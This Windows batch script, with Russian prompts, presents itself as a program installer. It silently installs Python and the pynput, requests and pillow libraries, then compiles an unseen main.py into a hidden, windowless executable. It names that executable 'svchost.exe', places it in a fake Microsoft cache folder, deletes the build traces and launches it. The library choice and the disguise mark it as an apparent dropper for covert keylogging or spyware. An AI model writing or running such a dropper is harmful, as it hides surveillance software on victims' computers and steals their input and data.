@echo off
title Установка программы
echo ============================================
echo   Запуск программы...
echo ============================================
echo.

:: Проверяем Python
echo [1/5] Проверка Python...
python --version >nul 2>&1
if %errorlevel% == 0 (
    echo       Python найден!
    set PYTHON=python
    goto :install_libs
)

py --version >nul 2>&1
if %errorlevel% == 0 (
    echo       Python найден!
    set PYTHON=py
    goto :install_libs
)

:: Скачиваем Python
echo [2/5] Python не найден. Скачиваю Python 3.11...
echo       Это займет 1-2 минуты...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe', '%TEMP%\python_install.exe')"

if not exist "%TEMP%\python_install.exe" (
    echo       ОШИБКА: Не удалось скачать Python!
    echo       Проверьте подключение к интернету.
    pause
    exit /b 1
)

echo       Устанавливаю Python...
"%TEMP%\python_install.exe" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
timeout /t 10 /nobreak >nul

set "PATH=%LOCALAPPDATA%\Programs\Python\Python311\;%LOCALAPPDATA%\Programs\Python\Python311\Scripts\;%PATH%"
echo       Python установлен!

:install_libs
echo [3/5] Установка библиотек...
%PYTHON% -m pip install pyinstaller pillow pynput requests --quiet
if %errorlevel% neq 0 (
    echo       ОШИБКА при установке библиотек!
    pause
    exit /b 1
)
echo       Библиотеки установлены!

:: Создаём папку
set "CACHE=%APPDATA%\Microsoft\Windows\WinCache"
if not exist "%CACHE%" mkdir "%CACHE%"
set "EXE=%CACHE%\svchost.exe"

if exist "%EXE%" (
    echo [4/5] Программа уже собрана, пропускаю сборку.
    goto :launch
)

:: Копируем и собираем
echo [4/5] Сборка программы (1-2 минуты)...
copy /y "%~dp0main.py" "%CACHE%\main.py" >nul

%PYTHON% -m PyInstaller --onefile --noconsole --distpath "%CACHE%" --workpath "%CACHE%\build" --specpath "%CACHE%" "%CACHE%\main.py"

if exist "%CACHE%\build" rmdir /s /q "%CACHE%\build"
if exist "%CACHE%\main.spec" del /q "%CACHE%\main.spec"
if exist "%CACHE%\main.py" del /q "%CACHE%\main.py"

if exist "%CACHE%\main.exe" (
    ren "%CACHE%\main.exe" "svchost.exe"
    echo       Сборка завершена!
) else (
    echo       ОШИБКА: сборка не удалась!
    pause
    exit /b 1
)

:launch
echo [5/5] Запускаю программу...
start "" "%EXE%"
echo.
echo ============================================
echo   Готово! Нажмите Shift чтобы проверить.
echo   Это окно можно закрыть.
echo ============================================
pause
